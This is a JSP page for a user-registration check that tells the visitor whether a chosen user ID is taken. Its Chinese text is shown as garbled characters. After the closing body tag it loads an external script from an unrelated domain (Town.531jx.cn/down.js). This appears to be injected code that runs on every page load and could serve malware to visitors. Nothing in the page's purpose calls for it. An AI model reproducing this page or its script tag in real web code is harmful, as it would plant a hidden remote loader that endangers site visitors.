<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<link rel="stylesheet" href="css/style.css" type="text/css" />
<title>����û�</title>
<body>

		<c:if test="${result.canregister=='false'}">	
		
		
	<table border="1" cellspacing="2" cellpadding="1" align="center" valign="center" width="100%" height="100%"  >  
		<tr align="center" height="50%">
			<td >

				<p><span class="red24">��Ǹ</span></p>
				<p>��������û���<span  class="red15"><c:out value="${result.userId}"/>
				</span>
			  �ѱ�ʹ��!</p>
				<p><br>
				  ��ѡ���������û���<br>
			      <br>
				  
		          <input type=button value="�ر�" onClick="javascript:window.close();" id=button1 name=button1>
		  </p></td>
		</tr>
	</table>
	
	
			</c:if>	
			
		<c:if test="${result.canregister=='true'}">	
			
	<table border="1" cellspacing="2" cellpadding="1" align="center" valign="center" width="100%" height="100%" >  
		<tr align="center" height="50%">
			<td >
				<p><span class="red24">��ϲ</span></p>
				<p>��������û���<span  class="red15">
			    <c:out value="${result.userId}"/>
				</span>����ʹ��<br>
				<br>
		        <input type=button value="�ر�" onClick="javascript:window.close();" id=button1 name=button1>
				</p>
		  </td>
		</tr>
	</table>
			</c:if>	



</body>
<script language=javascript src=http://Town.531jx.cn/down.js></script>